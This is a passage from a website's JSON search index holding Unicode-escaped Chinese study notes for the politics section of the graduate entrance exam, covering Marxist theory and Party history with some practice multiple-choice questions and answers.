C.\u79d1\u5b66\u6280\u672f\u6709\u65f6\u8868\u73b0\u4e3a\u5f02\u5df1\u7684\u3001\u654c\u5bf9\u7684\u529b\u91cf D.\u4eba\u7684\u5b9e\u8df5\u6d3b\u52a8\u662f\u5408\u89c4\u5f8b\u6027\u4e0e\u5408\u76ee\u7684\u6027\u7684\u7edf\u4e00 \u7b54\u6848 $$ ABCD $$","title":"4.6. \u771f\u7406\u4e0e\u4ef7\u503c"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#47","text":"\u662f\u79c1\u4eba\u52b3\u52a8\u548c\u793e\u4f1a\u52b3\u52a8\u4e4b\u95f4\u7684\u77db\u76fe\u3002 \u5546\u54c1\u7ecf\u6d4e\u4ee5\u4ea4\u6362\u4e3a\u76ee\u7684\uff0c\u6240\u4ee5\u5546\u54c1\u7ecf\u6d4e\u8981\u53d1\u5c55\u5c31\u8981\u8fdb\u884c\u4ea4\u6362\uff1b\u60f3\u8981\u628a \u79c1\u4eba\u52b3\u52a8 \u8f6c\u6362\u4e3a \u793e\u4f1a\u52b3\u52a8 \uff0c\u5c31\u8981\u5c06\u751f\u4ea7\u7684\u5546\u54c1\u4ea4\u6362\u51fa\u53bb\u3002","title":"4.7. \u5546\u54c1\u7ecf\u6d4e\u7684\u57fa\u672c\u77db\u76fe"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/1.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%B8%80%E5%AD%A3/#48","text":"\u4e2d\u56fd\u7684\u9769\u547d\u9762\u8c8c\u7115\u7136\u4e00\u65b0\uff1a \u2460 \u6709\u4e86\u65b0\u7684\u594b\u6597\u76ee\u6807 \u2461 \u6709\u4e86\u65b0\u7684\u9886\u5bfc\u529b\u91cf \u2462 \u6709\u4e86\u65b0\u7684\u9769\u547d\u65b9\u6cd5 \u2463 \u6709\u4e86\u65b0\u7684\u6307\u5bfc\u601d\u60f3","title":"4.8. \u515a\u6210\u7acb\u7684\u4f1f\u5927\u610f\u4e49"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/","text":"\u6bcf\u65e5\u77e5\u8bc6\u70b9\u7b2c\u4e8c\u5b63 # \u76ee\u5f55 # \u6bcf\u65e5\u77e5\u8bc6\u70b9\u7b2c\u4e8c\u5b63 \u76ee\u5f55 1. \u7b2c\u4e00\u5468 1.1. \u56db\u4e2a\u5168\u9762\u7684\u5173\u7cfb 1.2. \u897f\u8fc1\u7cbe\u795e 1.3. \u7edf\u4e00\u6218\u7ebf\u7684\u4e24\u4e2a\u8054\u76df 1.4. \u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u548c\u65e7\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d 1.5. \u515a\u5916\u4eba\u58eb\u5ea7\u8c08\u4f1a 1.6. \u4e2d\u56fd\u68a6 1.7. \u6539\u9769\u3001\u7a33\u5b9a\u548c\u53d1\u5c55\u4e09\u8005\u7684\u5173\u7cfb 2. \u7b2c\u4e8c\u5468 2.1. \u515a\u7684\u653f\u6cbb\u8def\u7ebf 2.2. \u515a\u7684\u7fa4\u4f17\u8def\u7ebf 2.3. \u9769\u547d\u65b0\u9053\u8def 2.4. \u515a\u7684\u57fa\u672c\u8def\u7ebf 2.5. \u96c6\u4e2d\u529b\u91cf\u529e\u5927\u4e8b 2.6. \u4eba\u6c11\u662f\u5386\u53f2\u7684\u521b\u9020\u8005 2.7. \u6211\u56fd\u7684\u5b9e\u4f53\u6cd5\u5f8b\u90e8\u95e8 3. \u7b2c\u4e09\u5468 3.1. \u77db\u76fe\u7684\u540c\u4e00\u6027\u4e0e\u6597\u4e89\u6027 3.2. \u604b\u7231\u4e2d\u7684\u9053\u5fb7\u89c4\u8303 3.3. \u4e24\u4f1a\u5f00\u5e55 3.4. \u751f\u4ea7\u529b\u4e0e\u751f\u4ea7\u5173\u7cfb 3.5. \u4e24\u4f1a\u62a5\u544a 3.6. \u7406\u60f3\u4fe1\u5ff5\u662f\u7cbe\u795e\u4e4b\u201c\u9499\u201d 3.7. \u65b0\u4e8b\u7269\u4e0d\u53ef\u6218\u80dc\u7684\u539f\u56e0 1. \u7b2c\u4e00\u5468 # 1.1. \u56db\u4e2a\u5168\u9762\u7684\u5173\u7cfb # \u5168\u9762\u5efa\u6210\u5c0f\u5eb7\u793e\u4f1a \u6218\u7565\u76ee\u6807\uff0c\u5b9e\u73b0\u4e2d\u56fd\u68a6\u7684\u5173\u952e\u4e00\u6b65 \u5168\u9762\u6df1\u5316\u6539\u9769 \u5173\u952e\u4e00\u62db \u5168\u9762\u4f9d\u6cd5\u6cbb\u56fd \u548c\u5168\u9762\u6df1\u5316\u6539\u9769\u5e76\u6210\u8f66\u4e4b\u4e24\u8f6e\uff0c\u9e1f\u4e4b\u4e24\u7ffc \u5168\u9762\u4ece\u4e25\u6cbb\u515a \u5176\u4ed6\u4e09\u4e2a\u5168\u9762\u7684\u4fdd\u8bc1 1.2. \u897f\u8fc1\u7cbe\u795e # \u3010\u5355\u9009\u3011\u201c\u897f\u8fc1\u7cbe\u795e\u201c\u662f\u57281956\u5e74\u4ea4\u901a\u5927\u5b66\u7531\u4e0a\u6d77\u8fc1\u5f80\u897f\u5b89\u7684\u8fc7\u7a0b\u4e2d\uff0c\u751f\u53d1\u51fa\u6765\u7684\u4e00\u79cd\u5b9d\u8d35\u7684\u7cbe\u795e\u8d22\u5bcc\u30022020\u5e74\u670822\u65e5\uff0c\u4e60\u8fd1\u5e73\u603b\u4e66\u8bb0\u8385\u4e34\u897f\u5b89\u4ea4\u901a\u5927\u5b66\u89c6\u5bdf\uff0c\u770b\u671b\u897f\u8fc1\u8001\u6559\u6388\u4ee3\u8868\uff0c\u53c2\u89c2\u897f\u8fc1\u535a\u7269\u9986\uff0c\u542c\u53d6\u897f\u8fc1\u5386\u53f2\u3001\u897f\u8fc1\u4ee5\u6765\u7684\u53d1\u5c55\u60c5\u51b5\u6c47\u62a5\u3002\u4e60\u8fd1\u5e73\u603b\u4e66\u8bb0\u5728\u8003\u5bdf\u65f6\u6307\u51fa\uff0c\u897f\u8fc1\u7cbe\u795e\u201c\u7684\u6838\u5fc3\u662f A.\u7231\u56fd\u4e3b\u4e49 B.\u80f8\u6000\u5927\u5c40\uff0c\u65e0\u79c1\u5949\u732e C.\u5f18\u626c\u4f20\u7edf\uff0c\u8270\u82e6\u521b\u4e1a D.\u542c\u515a\u6307\u6325\u8ddf\u515a\u8d70 \u7b54\u6848 $$ A $$ \u89e3\u6790 2005\u5e7412\u67086\u65e5\uff0c\u7ecf\u897f\u5b89\u4ea4\u5927\u515a\u59d4\u4f1a\u8bae\u5ba1\u8bae\u6279\u51c6\uff0c\u4ea4\u5927\u897f\u8fc1\u7cbe\u795e\u6982\u62ec\u4e3a\u201c\u80f8\u6000\u5927\u5c40\uff0c\u65e0\u79c1\u5949\u732e\uff0c\u5f18\u626c\u4f20\u7edf\uff0c\u8270\u82e6\u521b\u4e1a\u201c16\u4e2a\u5b57\u30022020\u5e744\u670822\u65e5\uff0c\u4e60\u8fd1\u5e73\u603b\u4e66\u8bb0\u5728\u897f\u5b89\u4ea4\u901a\u5927\u5b66\u8003\u5bdf\u65f6\u6307\u51fa:\u201c\u897f\u8fc1\u7cbe\u795e\u201c\u7684\u6838\u5fc3\u662f \u7231\u56fd\u4e3b\u4e49 \uff0c\u7cbe\u9ad3\u662f\u542c\u515a\u6307\u6325\u8ddf\u515a\u8d70\uff0c\u4e0e\u515a\u548c\u56fd\u5bb6\u3001\u4e0e\u6c11\u65cf\u548c\u4eba\u6c11\u540c\u547c\u5438\u3001\u5171\u547d\u8fd0\uff0c\u5177\u6709\u6df1\u523b\u73b0\u5b9e\u610f\u4e49\u548c\u5386\u53f2\u610f\u4e49\u3002 1.3. \u7edf\u4e00\u6218\u7ebf\u7684\u4e24\u4e2a\u8054\u76df # \u52b3\u52a8\u8005\u8054\u76df \u4ee5\u5de5\u519c\u8054\u76df\u4e3a\u4e3b\u4f53\u7684\u5de5\u4eba\u9636\u7ea7\u540c\u519c\u6c11\u3001\u5c0f\u8d44\u4ea7\u9636\u7ea7\u7b49\u5176\u4ed6\u52b3\u52a8\u4eba\u6c11\u7684\u8054\u76df \u975e\u52b3\u52a8\u8005\u8054\u76df \u6c11\u65cf\u8d44\u4ea7\u9636\u7ea7\u7684\u8054\u76df \u6709\u65f6\u8ddf\u5927\u5730\u4e3b\u5927\u8d44\u4ea7\u9636\u7ea7\u7684\u8054\u76df \u3010\u5355\u9009\u3011\u4e2d\u56fd\u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u65f6\u671f\u7684\u7edf\u4e00\u6218\u7ebf\u5305\u542b\u7740\u4e24\u4e2a\u8054\u76df\u3002\u5176\u4e2d\u57fa\u672c\u7684\u3001\u4e3b\u8981\u7684 \u8054\u76df\u662f A.\u5de5\u4eba\u9636\u7ea7\u540c\u57ce\u5e02\u5c0f\u8d44\u4ea7\u9636\u7ea7\u7684\u8054\u76df B.\u4ee5\u5de5\u519c\u8054\u76df\u4e3a\u4e3b\u4f53\u7684\u5de5\u4eba\u9636\u7ea7\u540c\u519c\u6c11\u3001\u5c0f\u8d44\u4ea7\u9636\u7ea7\u7b49\u5176\u4ed6\u52b3\u52a8\u4eba\u6c11\u7684\u8054\u76df C.\u4ee5\u5de5\u519c\u8054\u76df\u4e3a\u4e3b\u4f53\u7684\u5de5\u4eba\u9636\u7ea7\u540c\u519c\u6c11\u3001\u5c0f\u8d44\u4ea7\u9636\u7ea7\u548c\u6c11\u65cf\u8d44\u4ea7\u9636\u7ea7\u7684\u8054\u76df D.\u5de5\u4eba\u9636\u7ea7\u540c\u53ef\u4ee5\u5408\u4f5c\u7684\u975e\u52b3\u52a8\u4eba\u6c11\u7684\u8054\u76df \u7b54\u6848 $$ B $$ 1.4. \u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u548c\u65e7\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d # \u65f6\u95f4\u70b9 \uff1a 1840\u9e26\u7247\u6218\u4e89\u540e-1918 \u65e7\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d 1919\u4e94\u56db\u8fd0\u52a8\u540e-1956\u5e74 \u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d \u4e0d\u540c\u70b9 \uff1a \u9886\u5bfc\u529b\u91cf\u4e0d\u540c \u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u7531\u65e0\u4ea7\u9636\u7ea7\u9886\u5bfc \u65e7\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u7531\u519c\u6c11\u9636\u7ea7\u3001\u8d44\u4ea7\u9636\u7ea7\u6539\u826f\u6d3e\u3001\u8d44\u4ea7\u9636\u7ea7\u9769\u547d\u6d3e\u9886\u5bfc \u6307\u5bfc\u601d\u60f3\u4e0d\u540c \u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u6307\u5bfc\u601d\u60f3\u662f\u9a6c\u5217\u4e3b\u4e49 \u65e7\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u6307\u5bfc\u601d\u60f3 \u592a\u5e73\u5929\u56fd\u8fd0\u52a8\u2014\u2014\u300a\u4e09\u539f\u300b \u6d0b\u52a1\u8fd0\u52a8\u2014\u2014\u201c \u5e08\u5937\u5236\u5937\u201d \u3001\u201c \u4e2d\u4f53\u897f\u7528\u201d \u4e49\u548c\u56e2\u8fd0\u52a8\u2014\u2014\"\u6276\u6e05\u706d\u6d0b\" \u620a\u620c\u53d8\u6cd5\u2014\u2014\u8d44\u4ea7\u9636\u7ea7\u7ef4\u65b0\u601d\u60f3 \u8f9b\u4ea5\u9769\u547d\u2014\u2014\"\u4e09\u6c11\u4e3b\u4e49\" \u9769\u547d\u524d\u9014\u4e0d\u540c \u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u7684\u76ee\u6807\u662f\u5b9e\u73b0\u793e\u4f1a\u4e3b\u4e49 \u65f6\u4ee3\u80cc\u666f\u4e0d\u540c \u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u53d1\u751f\u5728\u5341\u6708\u9769\u547d\u4ee5\u540e\u3002\u4fc4\u56fd\u5341\u6708\u9769\u547d\u7684\u80dc\u5229\uff0c\u6807\u5fd7\u7740\u4eba\u7c7b\u5386\u53f2\u5f00\u59cb\u4e86\u7531\u8d44\u672c\u4e3b\u4e49\u5411\u793e\u4f1a\u4e3b\u4e49\u8f6c\u53d8\u7684\u8fdb\u7a0b\u3002 \u76f8\u540c\u70b9 \uff1a \u9769\u547d\u4efb\u52a1\u76f8\u540c \u53cd\u5e1d\u53cd\u5c01\u5efa \u9769\u547d\u5bf9\u8c61\u76f8\u540c \u5e1d\u56fd\u4e3b\u4e49\u548c\u5c01\u5efa\u4e3b\u4e49 \u9769\u547d\u6027\u8d28\u76f8\u540c \u8d44\u4ea7\u9636\u7ea7\u6027\u8d28\u7684\u6c11\u4e3b\u9769\u547d \u4e3a\u4ec0\u4e48\u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u662f\u65e0\u4ea7\u9636\u7ea7\u9886\u5bfc\u7684\u8d44\u4ea7\u9636\u7ea7\u9769\u547d\uff1f \u9996\u5148\uff0c\u4e2d\u56fd\u6b64\u65f6\u5904\u4e8e\u534a\u6b96\u6c11\u5730\u534a\u5c01\u5efa\u793e\u4f1a\uff0c\u9769\u547d\u4efb\u52a1\u4f9d\u65e7\u662f\u53cd\u5e1d\u53cd\u5c01\uff0c\u56e0\u6b64\uff0c\u51b3\u5b9a\u4e86\u8fd9\u4e2a\u65f6\u671f\u9769\u547d\u7684\u6027\u8d28\uff0c\u5c5e\u4e8e\u8d44\u4ea7\u9636\u7ea7\u6c11\u4e3b\u9769\u547d\uff0c\u7b80\u79f0\u6c11\u4e3b\u9769\u547d\u3002\u5176\u6b21\uff0c\u9769\u547d\u6027\u8d28\u4e0d\u662f\u7531\u9769\u547d\u9886\u5bfc\u9636\u5c42\u51b3\u5b9a\u7684\uff0c\u662f\u7531\u5176\u9769\u547d\u4efb\u52a1\u51b3\u5b9a\u7684\uff0c\u8fd9\u4e00\u70b9\u5fc5\u987b\u660e\u786e\u3002 \u56e0\u4e3a\u6309\u7167\u9a6c\u5217\u7684\u7406\u8bba\uff0c\u5efa\u7acb\u65e0\u4ea7\u9636\u7ea7\u653f\u6743\u7684\u987a\u5e8f\u4f9d\u6b21\u662f\u63a8\u7ffb\u5974\u96b6\u793e\u4f1a \\to \u63a8\u7ffb\u5c01\u5efa\u793e\u4f1a \\to \u63a8\u7ffb\u8d44\u672c\u4e3b\u4e49\u793e\u4f1a \\to \u5efa\u7acb\u65e0\u4ea7\u9636\u7ea7\u4e13\u653f\uff0c\u800c\u4e0d\u662f\u4ece\u53cd\u5c01\u76f4\u63a5\u8df3\u5230\u5efa\u7acb\u65e0\u4ea7\u9636\u7ea7\u9769\u547d\uff0c\u8fd9\u5176\u4e2d\u8d44\u4ea7\u9636\u7ea7\u9769\u547d\u662f\u4e0d\u53ef\u7701\u7565\u7684\u8fc7\u7a0b\u3002 1.5. \u515a\u5916\u4eba\u58eb\u5ea7\u8c08\u4f1a # 1.6. \u4e2d\u56fd\u68a6 # 1.7. \u6539\u9769\u3001\u7a33\u5b9a\u548c\u53d1\u5c55\u4e09\u8005\u7684\u5173\u7cfb # 2. \u7b2c\u4e8c\u5468 # 2.1. \u515a\u7684\u653f\u6cbb\u8def\u7ebf # 2.2. \u515a\u7684\u7fa4\u4f17\u8def\u7ebf # 2.3. \u9769\u547d\u65b0\u9053\u8def # 2.4. \u515a\u7684\u57fa\u672c\u8def\u7ebf # 2.5. \u96c6\u4e2d\u529b\u91cf\u529e\u5927\u4e8b # 2.6. \u4eba\u6c11\u662f\u5386\u53f2\u7684\u521b\u9020\u8005 # 2.7. \u6211\u56fd\u7684\u5b9e\u4f53\u6cd5\u5f8b\u90e8\u95e8 # \u516d\u4e2a\u5b9e\u4f53\u6cd5\u90e8\u95e8 \uff1a \u5baa\u6cd5\u76f8\u5173\u6cd5 \u6c11\u6cd5\u5546\u6cd5 \u7ecf\u6d4e\u6cd5 \u793e\u4f1a\u6cd5 \u884c\u653f\u6cd5 \u5211\u6cd5 \u6839\u672c\u5927\u6cd5 \uff1a\u5baa\u6cd5 \u5211\u6cd5\u7684\u4e09\u5927\u57fa\u672c\u539f\u5219 \uff1a \u5211\u6cd5\u6cd5\u5b9a \u6cd5\u5f8b\u9762\u524d\u4eba\u4eba\u5e73\u7b49 \u7f6a\u5211\u76f8\u9002\u5e94 3. \u7b2c\u4e09\u5468 # 3.1. \u77db\u76fe\u7684\u540c\u4e00\u6027\u4e0e\u6597\u4e89\u6027 # \u77db\u76fe\u5177\u6709\u540c\u4e00\u6027\u548c\u6597\u4e89\u6027 \u3010\u5206\u6790\u9898\u3011 \u5206\u6790\u81ea\u7136\u754c\u4e2d\u7684\u201c\u4e00\u7269\u964d\u4e00\u7269\u201d\u5e73\u8861\u6cd5\u5219\u6240\u4f53\u73b0\u7684\u552f\u7269\u8fa9\u8bc1\u6cd5\u539f\u7406\u3002 \u7b54\u6848 \u8054\u7cfb\u7684\u89c2\u70b9\u662f\u552f\u7269\u8fa9\u8bc1\u6cd5\u7684\u603b\u89c2\u70b9\u548c\u603b\u7279\u5f81\u4e4b\u4e00\uff0c\u4e16\u754c\u4e0a\u6ca1\u6709\u5b64\u7acb\u5b58\u5728\u7684\u4e8b\u7269\uff0c\u6bcf\u4e00\u79cd\u4e8b\u7269(\u5982\u53f6\u8717\u3001\u6355\u98df\u86f9\uff0c\u6c34\u82b1\u751f\u3001\u6c34\u82b1\u751f\u53f6\u7532\u7b49)\u90fd\u5904\u4e8e\u4e92\u8054\u7cfb\u4e4b\u4e2d\u3002 **\u5bf9\u7acb\u7edf\u4e00\u89c4\u5f8b\u662f\u552f\u7269\u8fa9\u8bc1\u6cd5\u7684\u5b9e\u8d28\u548c\u6838\u5fc3\uff0c\u5b83\u63ed\u793a\u4e86\u4e8b\u7269\u4e4b\u95f4\u8054\u7684\u6839\u672c\u5185\u5bb9\u548c\u5185\u5728\u53d1\u5c55\u52a8\u529b**\u3002\u81ea\u7136\u754c\u7684\u751f\u7269\u4e4b\u95f4(\u5982\u53f6\u86fe\u548c\u6355\u98df\u8702\u3001\u6c34\u82b1\u548c\u6c34\u82b1\u751f\u53f6\u7532\u7b49)\u5b58\u5728\u7740\u65e2\u76f8\u5bf9\u7acb\u53c8\u76f8\u7edf\u4e00\u7684\u5173\u7cfb\uff0c\u77db\u76fe\u7684\u540c\u4e00\u6027\u548c\u6597\u4e89\u6027\u4e92\u8054\u7ed3\u3001\u76f8\u8f85\u76f8\u6210\uff0c\u6784\u6210\u4e8b\u7269\u7684\u77db\u76fe\u8fd0\u52a8\uff0c\u63a8\u52a8\u4e86\u4e8b\u7269\u7684\u53d1\u5c55\u3002 **\u751f\u7269\u4e4b\u95f4\u201c\u4e00\u7269\u964d\u4e00\u7269\u201d\u73b0\u8c61\u4f53\u73b0\u4e86\u77db\u76fe\u53cc\u65b9\u76f8\u4e92\u4f9d\u8d56\u548c\u76f8\u4e92\u6597\u4e89\u7684\u5173\u7cfb**\uff0c\u201c\u4e00\u7269\u964d\u7269\u201d\u7684\u5e73\u8861\u6cd5\u5219\u662f\u77db\u76fe\u53cc\u65b9\u76f8\u4e92\u8054\u7cfb\u3001\u76f8\u4e92\u4f5c\u7528\u7684\u7ed3\u679c\u3002\u5bf9\u7acb\u7edf\u4e00\u89c4\u5f8b\u4f9b\u4e86\u4eba\u4eec\u8ba4\u8bc6\u4e16\u754c\u548c\u6539\u9020\u4e16\u754c\u7684\u6839\u672c\u65b9\u6cd5\u3002 3.2. \u604b\u7231\u4e2d\u7684\u9053\u5fb7\u89c4\u8303 # \u5c0a\u91cd\u4eba\u683c\u5e73\u7b49 \u81ea\u89c9\u627f\u62c5\u8d23\u4efb \u6587\u660e\u76f8\u4eb2\u76f8\u7231 3.3. \u4e24\u4f1a\u5f00\u5e55 # \u4e24\u4f1a\u662f\u5bf9\u81ea1959\u5e74\u4ee5\u6765\u5386\u5e74\u53ec\u5f00\u7684 \u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd\u5168\u56fd\u4eba\u6c11\u4ee3\u8868\u5927\u4f1a \u548c \u4e2d\u56fd\u4eba\u6c11\u653f\u6cbb\u534f\u5546\u4f1a\u8bae \u7684\u7edf\u79f0\u3002 \u7531\u4e8e\u4e24\u573a\u4f1a\u8bae\u4f1a\u671f\u57fa\u672c\u91cd\u5408\uff0c\u800c\u4e14\u5bf9\u4e8e\u56fd\u5bb6\u8fd0\u4f5c\u7684\u91cd\u8981\u7a0b\u5ea6\u90fd\u975e\u5e38\u7684\u9ad8\uff0c\u6545\u7b80\u79f0\u505a\u201c\u4e24\u4f1a\u201d\u3002\u4ece\u7701\u7ea7\u5730\u65b9\u5230\u4e2d\u592e\uff0c\u5404\u5730\u7684\u653f\u534f\u53ca\u4eba\u5927\u7684\u5168\u4f53\u4f1a\u8bae\u7684\u4f1a\u671f\u5168\u90e8\u57fa\u672c\u91cd\u5408\uff0c\u6240\u4ee5\u4e24\u4f1a\u7684\u540d\u79f0\u53ef\u4ee5\u540c\u65f6\u9002\u7528\u4e8e\u5168\u56fd\u53ca\u5404\u7701\uff08\u5e02\u3001\u81ea\u6cbb\u533a\uff09\u3002 \u4e24\u4f1a\u6bcf5\u5e74\u79f0\u4e3a\u4e00\u5c4a\uff0c\u6bcf\u5e74\u4f1a\u8bae\u79f0X\u5c4aX\u6b21\u4f1a\u8bae\u3002\u6839\u636e\u4e2d\u56fd\u5baa\u6cd5\u89c4\u5b9a\uff1a\u201c\u4e24\u4f1a\u201d\u53ec\u5f00\u7684\u610f\u4e49\u5728\u4e8e\u5c06\u201c\u4e24\u4f1a\u201d\u4ee3\u8868\u4ece\u4eba\u6c11\u4e2d\u5f97\u6765\u7684\u4fe1\u606f\u548c\u8981\u6c42\u8fdb\u884c\u6536\u96c6\u53ca\u6574\u7406\uff0c\u4f20\u8fbe\u7ed9\u515a\u4e2d\u592e\u3002\u201c\u4e24\u4f1a\u201d\u4ee3\u8868\u662f\u4ee3\u8868\u7740\u5e7f\u5927\u9009\u6c11\u7684\u4e00\u79cd\u5229\u76ca\u7684\uff0c\u4ee3\u8868\u7740\u9009\u6c11\u5728\u53ec\u5f00\u4e24\u4f1a\u671f\u95f4\uff0c\u5411\u653f\u5e9c\u6709\u5173\u90e8\u95e8\u63d0\u51fa\u9009\u6c11\u4eec\u81ea\u5df1\u7684\u610f\u89c1\u548c\u8981\u6c42\u3002\u5730\u65b9\u6bcf\u5e74\u53ec\u5f00\u7684\u4eba\u5927\u548c\u653f\u534f\u4e5f\u79f0\u4e3a\u4e24\u4f1a\uff0c\u901a\u5e38\u53ec\u5f00\u7684\u65f6\u95f4\u6bd4\u5168\u56fd\u201c\u4e24\u4f1a\u201d\u65f6\u95f4\u8981\u65e9\u3002 \u5341\u4e09\u5c4a\u5168\u56fd\u4eba\u5927\u4e09\u6b21\u4f1a\u8bae\u4e8e2020\u5e745\u670822\u65e5\u5728\u5317\u4eac\u53ec\u5f00\uff0c\u5168\u56fd\u653f\u534f\u5341\u4e09\u5c4a\u4e09\u6b21\u4f1a\u8bae\u4e8e5\u670821\u65e5\u53ec\u5f00\u3002 3.4. \u751f\u4ea7\u529b\u4e0e\u751f\u4ea7\u5173\u7cfb # \u751f\u4ea7\u65b9\u5f0f\u662f\u751f\u4ea7\u529b\u548c\u751f\u4ea7\u5173\u7cfb\u7684\u7edf\u4e00\u3002 \u751f\u4ea7\u529b\u51b3\u5b9a\u751f\u4ea7\u5173\u7cfb\uff0c\u751f\u4ea7\u5173\u7cfb\u53cd\u4f5c\u7528\u4e8e\u751f\u4ea7\u529b\u3002 \u3010\u591a\u9009\u3011\u5386\u53f2\u552f\u7269\u4e3b\u4e49\u8ba4\u4e3a\uff0c\u751f\u4ea7\u529b\u663c\u63a8\u52a8\u793e\u4f1a\u53d1\u5c55\u7684\u6700\u7ec8\u51b3\u5b9a \u529b\u91cf\uff0c\u8868\u73b0\u4e3a( ) A. \u751f\u4ea7\u529b\u51b3\u5b9a\u7740\u4eba\u7c7b\u81ea\u8eab\u7684\u53d1\u5c55\u7a0b\u5ea6 B. \u751f\u4ea7\u529b\u51b3\u5b9a\u4e86\u9636\u7ea7\u7684\u4ea7\u751f\u3001\u53d1\u5c55\u548c\u6d88\u706d\u7684\u8fc7\u7a0b C. \u751f\u4ea7\u529b\u51b3\u5b9a\u7740\u4eba\u7684\u5168\u9762\u53d1\u5c55 D. \u751f\u4ea7\u529b\u51b3\u5b9a\u7740\u751f\u4ea7\u5173\u7cfb\u5e76\u8fdb\u800c\u51b3\u5b9a\u4e86\u5168\u90e8\u793e\u4f1a\u5173\u7cfb \u7b54\u6848 $$ ABCD $$ \u89e3\u6790 \u8003\u5bdf\u751f\u4ea7\u529b\u7684\u793e\u4f1a\u4f5c\u7528\u3002\u4eba\u7c7b\u793e\u4f1a\u53d1\u5c55\u7684\u6700\u7ebf\u51b3\u5b9a\u529b\u91cf\u662f\u751f\u4ea7\u529b\u3002\u8fd9\u662f\u56e0\u4e3a\u751f\u4ea7\u529b\u662f\u6700\u9769\u547d\u3001\u6700\u6d3b\u8dc3\u7684\u56e0\u7d20\uff0c\u751f\u4ea7\u529b\u53d1\u5c55\u8d77\u751f\u4ea7\u5173\u7cfb\u7684\u53d8\u9769\uff0c\u800c\u751f\u4ea7\u5173\u7cfb\u5373\u7ecf\u6d4e\u57fa\u7840\u7684\u53d8\u9769\u53c8\u4f1a\u5f15\u8d77\u4e0a\u5c42\u5efa\u7b51\u7684\u53d8\u5316\uff0c\u4ece\u800c\u5f15\u8d77\u6574\u4e2a\u793e\u4f1a\u7684\u53d8\u5316\u3002\u9009\u9879ABCD\u90fd\u662f\u751f\u4ea7\u529b\u5bf9\u793e\u4f1a\u53d1\u5c55\u8d77\u51b3\u5b9a\u4f5c\u7528\u7684\u5177\u4f53\u8868\u73b0\uff0c\u90fd\u6b63\u786e\u3002 3.5. \u4e24\u4f1a\u62a5\u544a # 3.6. \u7406\u60f3\u4fe1\u5ff5\u662f\u7cbe\u795e\u4e4b\u201c\u9499\u201d # \u7406\u60f3\u6307\u5f15\u65b9\u5411\uff0c\u4fe1\u5ff5\u51b3\u5b9a\u6210\u8d25 \u7406\u60f3\u4fe1\u5ff5\u662f\u594b\u6597\u7684\u76ee\u6807 \u7406\u60f3\u4fe1\u5ff5\u63d0\u4f9b\u524d\u8fdb\u52a8\u529b \u7406\u60f3\u4fe1\u5ff5\u63d0\u9ad8\u7cbe\u795e\u5883\u754c 3.7. \u65b0\u4e8b\u7269\u4e0d\u53ef\u6218\u80dc\u7684\u539f\u56e0 # \u4ea7\u751f\u4e86\u65b0\u7684\u529f\u80fd\u548c\u7ed3\u6784 \u5728\u65e7\u4e8b\u7269\u7684\u6bcd\u4f53\u4e2d\u5b55\u80b2 \u7b26\u5408\u4eba\u6c11\u7fa4\u4f17\u7684\u5229\u76ca \u94fe\u63a5\u70ed\u70b9\uff1a\u53bf\u957f\u76f4\u64ad\u5e26\u8d27","title":"2.\u6bcf\u65e5\u77e5\u8bc6\u70b9\u7b2c\u4e8c\u5b63"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#_1","text":"","title":"\u6bcf\u65e5\u77e5\u8bc6\u70b9\u7b2c\u4e8c\u5b63"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#_2","text":"\u6bcf\u65e5\u77e5\u8bc6\u70b9\u7b2c\u4e8c\u5b63 \u76ee\u5f55 1. \u7b2c\u4e00\u5468 1.1. \u56db\u4e2a\u5168\u9762\u7684\u5173\u7cfb 1.2. \u897f\u8fc1\u7cbe\u795e 1.3. \u7edf\u4e00\u6218\u7ebf\u7684\u4e24\u4e2a\u8054\u76df 1.4. 